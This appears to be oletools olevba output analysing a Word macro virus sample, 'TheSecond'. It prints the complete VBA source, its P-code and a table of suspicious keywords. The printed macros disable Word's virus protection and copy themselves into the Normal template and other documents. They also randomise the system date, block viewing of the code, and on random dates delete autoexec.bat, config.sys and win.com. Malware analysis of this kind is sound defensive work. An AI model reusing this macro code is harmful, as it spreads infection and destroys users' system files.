olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Fesaem_b.bas 
in file: Virus.MSWord.TheSecond.o - OLE stream: 'Macros/VBA/Fesaem_b'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Copy = True
  If Documents.Count >= 1 Then
    C = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To C
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Fesaem_b" Then Copy = False
    Next i
    x = "C:\windows\system\win.dll"
    If Copy Then
      ActiveDocument.VBProject.VBComponents("Fesaem_b").Export (x)
      NormalTemplate.VBProject.VBComponents.Import (x)
    End If
    Copy = True
    izm = False
    s = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "Fesaem_b" Then Copy = False
    Next i
    If Copy Then
      NormalTemplate.VBProject.VBComponents("Fesaem_b").Export (x)
      ActiveDocument.VBProject.VBComponents.Import (x)
      izm = True
    End If
    If s And izm And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      Randomize
      rd = Date
      dd = Str(Int((28 * Rnd) + 1))
      mm = Str(Int((12 * Rnd) + 1))
      yy = Str(Int((30 * Rnd) + 1980))
      rd = mm + "." + dd + "." + yy
      Date = rd
      ActiveDocument.Save
    End If
    ActiveDocument.Saved = s
    beep
  End If
End Sub

Sub AutoOpen()
On Error Resume Next
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Del
End Sub
Sub FilePrint()
    Selection.HomeKey Unit:=wdStory
    Selection.Font.Size = 16
    Selection.Font.Bold = wdToggle
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.TypeText Text:="Far Easten State Academy of Economics and Managment"
    ActiveDocument.WritePassword = "Fesaem"
    If ActiveDocument.Saved And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
    MsgBox ("Ñèñòåìíûé àäìèíèñòðàòîð çàïðåòèë äîñòóï ê ìàêðîñàì!!!")
End Sub
Sub Del()
  'Del virus Fesaem and TheSecond
  flag = False
  If Documents.Count >= 1 Then
     On Error Resume Next
       Application.OrganizerDelete Source:="C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot", Name:="TheSecond", Object:=wdOrganizerObjectProjectItems
       s = ActiveDocument.Path + "\" + ActiveDocument.Name
       Application.OrganizerDelete Source:=s, Name:="TheSecond", Object:=wdOrganizerObjectProjectItems

       Application.OrganizerDelete Source:="C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot", Name:="Fesaem", Object:=wdOrganizerObjectProjectItems
       s = ActiveDocument.Path + "\" + ActiveDocument.Name
       Application.OrganizerDelete Source:=s, Name:="Fesaem", Object:=wdOrganizerObjectProjectItems

       Application.OrganizerDelete Source:="C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot", Name:="Fesaem_a", Object:=wdOrganizerObjectProjectItems
       s = ActiveDocument.Path + "\" + ActiveDocument.Name
       Application.OrganizerDelete Source:=s, Name:="Fesaem_a", Object:=wdOrganizerObjectProjectItems
       If ActiveDocument.Saved And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
  End If
'Del sys file
  s = Date
  d = Left(s, 2)
  m = Mid(s, 4, 2)
  y = Right(s, 2)
  Randomize
  rn = Int((10 * Rnd) + 1)
  If Val(d) > 12 And Val(m) > 2 And Val(y) >= 2 And rn = 3 Then
    If Dir("c:\autoexec.bat") <> "" Then
      FileCopy "C:\Autoexec.bat", "C:\windows\system\wina.ini"
      Kill "c:\autoexec.bat"
    End If
    If Dir("c:\config.sys") <> "" Then
      FileCopy "C:\config.sys", "C:\windows\system\wins.ini"
      Kill ("C:\config.sys")
    End If
    If Dir("C:\windows\win.com") <> "" Then
      FileCopy "C:\windows\win.com", "C:\windows\system\wjn.co_"
      Kill ("C:\windows\win.com")
    End If
    If Int((15 * Rnd) + 1) = 15 Then
      For i = 1 To 5
        shell ("winword.exe")
      Next i
    End If
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheSecond.o
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Fesaem_b - 6597 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	LitVarSpecial (True)
' 	St Copy 
' Line #4:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #5:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St C 
' Line #6:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld C 
' 	For 
' Line #7:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Fesaem_b"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Copy 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #9:
' 	LitStr 0x0019 "C:\windows\system\win.dll"
' 	St x 
' Line #10:
' 	Ld Copy 
' 	IfBlock 
' Line #11:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0008 "Fesaem_b"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	Ld x 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitVarSpecial (True)
' 	St Copy 
' Line #15:
' 	LitVarSpecial (False)
' 	St izm 
' Line #16:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Fesaem_b"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Copy 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld Copy 
' 	IfBlock 
' Line #21:
' 	Ld x 
' 	Paren 
' 	LitStr 0x0008 "Fesaem_b"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #22:
' 	Ld x 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #23:
' 	LitVarSpecial (True)
' 	St izm 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld s 
' 	Ld izm 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #26:
' 	ArgsCall Read 0x0000 
' Line #27:
' 	Ld Date 
' 	St rd 
' Line #28:
' 	LitDI2 0x001C 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	St dd 
' Line #29:
' 	LitDI2 0x000C 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	St mm 
' Line #30:
' 	LitDI2 0x001E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x07BC 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	St yy 
' Line #31:
' 	Ld mm 
' 	LitStr 0x0001 "."
' 	Add 
' 	Ld dd 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	Ld yy 
' 	Add 
' 	St rd 
' Line #32:
' 	Ld rd 
' 	St Date 
' Line #33:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #36:
' 	ArgsCall beep 0x0000 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Sub AutoOpen())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #44:
' 	ArgsCall Del 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub FilePrint())
' Line #47:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #48:
' 	LitDI2 0x0010 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #49:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #50:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #51:
' 	LitStr 0x0033 "Far Easten State Academy of Economics and Managment"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #52:
' 	LitStr 0x0006 "Fesaem"
' 	Ld ActiveDocument 
' 	MemSt WritePassword 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub ToolsMacro())
' Line #57:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub ViewVBCode())
' Line #60:
' 	LitStr 0x0035 "Ñèñòåìíûé àäìèíèñòðàòîð çàïðåòèë äîñòóï ê ìàêðîñàì!!!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub Del())
' Line #63:
' 	QuoteRem 0x0002 0x001E "Del virus Fesaem and TheSecond"
' Line #64:
' 	LitVarSpecial (False)
' 	St flag 
' Line #65:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	LitStr 0x0034 "C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot"
' 	ParamNamed Source 
' 	LitStr 0x0009 "TheSecond"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #68:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St s 
' Line #69:
' 	Ld s 
' 	ParamNamed Source 
' 	LitStr 0x0009 "TheSecond"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #70:
' Line #71:
' 	LitStr 0x0034 "C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot"
' 	ParamNamed Source 
' 	LitStr 0x0006 "Fesaem"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #72:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St s 
' Line #73:
' 	Ld s 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Fesaem"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #74:
' Line #75:
' 	LitStr 0x0034 "C:\Program Files\Microsoft Office\Øàáëîíû\Normal.dot"
' 	ParamNamed Source 
' 	LitStr 0x0008 "Fesaem_a"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #76:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St s 
' Line #77:
' 	Ld s 
' 	ParamNamed Source 
' 	LitStr 0x0008 "Fesaem_a"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	QuoteRem 0x0000 0x000C "Del sys file"
' Line #81:
' 	Ld Date 
' 	St s 
' Line #82:
' 	Ld s 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	St d 
' Line #83:
' 	Ld s 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St m 
' Line #84:
' 	Ld s 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	St y 
' Line #85:
' 	ArgsCall Read 0x0000 
' Line #86:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St rn 
' Line #87:
' 	Ld d 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x000C 
' 	Gt 
' 	Ld m 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Ld y 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Ge 
' 	And 
' 	Ld rn 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #88:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #89:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitStr 0x001A "C:\windows\system\wina.ini"
' 	ArgsCall FileCopy 0x0002 
' Line #90:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsCall Kill 0x0001 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	LitStr 0x000D "c:\config.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #93:
' 	LitStr 0x000D "C:\config.sys"
' 	LitStr 0x001A "C:\windows\system\wins.ini"
' 	ArgsCall FileCopy 0x0002 
' Line #94:
' 	LitStr 0x000D "C:\config.sys"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	LitStr 0x0012 "C:\windows\win.com"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #97:
' 	LitStr 0x0012 "C:\windows\win.com"
' 	LitStr 0x0019 "C:\windows\system\wjn.co_"
' 	ArgsCall FileCopy 0x0002 
' Line #98:
' 	LitStr 0x0012 "C:\windows\win.com"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #102:
' 	LitStr 0x000B "winword.exe"
' 	Paren 
' 	ArgsCall shell 0x0001 
' Line #103:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |win.dll             |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

